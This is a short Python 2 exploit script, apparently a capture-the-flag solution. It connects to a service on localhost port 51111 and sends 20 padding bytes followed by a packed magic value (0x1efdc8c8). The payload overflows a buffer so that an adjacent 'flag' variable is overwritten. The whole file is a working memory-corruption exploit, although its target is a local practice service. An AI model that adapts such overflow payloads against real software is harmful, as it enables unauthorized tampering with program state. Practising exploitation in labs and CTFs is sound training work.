from socket import *
from struct import *


s = socket(AF_INET, SOCK_STREAM)
s.connect(("127.0.0.1", 51111))
p = lambda x: pack("<L", x)
print s.recv(1024)
flag = 0x1efdc8c8
payload = ""
payload += "a"*20
payload += p(flag)

s.send(payload)
	
print s.recv(1024)
